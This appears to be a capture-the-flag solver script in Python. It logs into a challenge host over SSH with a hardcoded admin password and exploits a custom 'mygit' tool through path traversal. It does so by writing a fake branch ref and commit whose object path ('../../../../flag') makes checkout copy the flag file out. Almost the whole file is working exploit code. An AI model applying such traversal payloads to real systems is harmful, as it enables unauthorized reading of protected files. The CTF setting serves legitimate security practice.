#!/usr/bin/env python3

import os
import paramiko
import logging
logging.disable()

HOST = os.environ.get("HOST", "git.ctf.pascalctf.it")
PORT = int(os.environ.get("PORT", 2222))
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "444B3xHdfLAA4otbECUT6CE3L3BrCX")

def run_ssh_command(cmd):
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(HOST, port=PORT, username="admin", password=ADMIN_PASSWORD, timeout=5)
        stdin, stdout, stderr = client.exec_command(cmd)
        exit_code = stdout.channel.recv_exit_status()
        out = stdout.read().decode()
        err = stderr.read().decode()
        client.close()
        return exit_code == 0, out, err
    except Exception as e:
        return False, "", str(e)

def main():
    assert isinstance(ADMIN_PASSWORD, str) and len(ADMIN_PASSWORD) > 0
    name = os.urandom(8).hex()
    status, res, err = run_ssh_command(
        f'''
mkdir -p {name} && 
cd {name} &&
mygit init >/dev/null &&
mkdir -p refs/heads commits &&
BRANCH_CONTENT="../../commits/fakecommit_padd_33X" && 
echo "$BRANCH_CONTENT" > refs/heads/fakebranch33X &&
OBJECT_HASH="../../../../../../../../../../flag" && 
OUTPUT_FILE="FLAG_STOLEN_BY_EXPLOIT_SUCCESS" && 

cat > commits/fakecommit_padd_33X << EOF
timestamp 1
message pwned
files 1
$OBJECT_HASH $OUTPUT_FILE
EOF
mygit checkout "../../../refs/heads/fakebranch33X" 2>&1
cat "$OUTPUT_FILE"
        '''
    )
    assert status, f"SSH command failed: {err}"
    print(res.strip().split("\n")[-1])

if __name__ == "__main__":
    main()
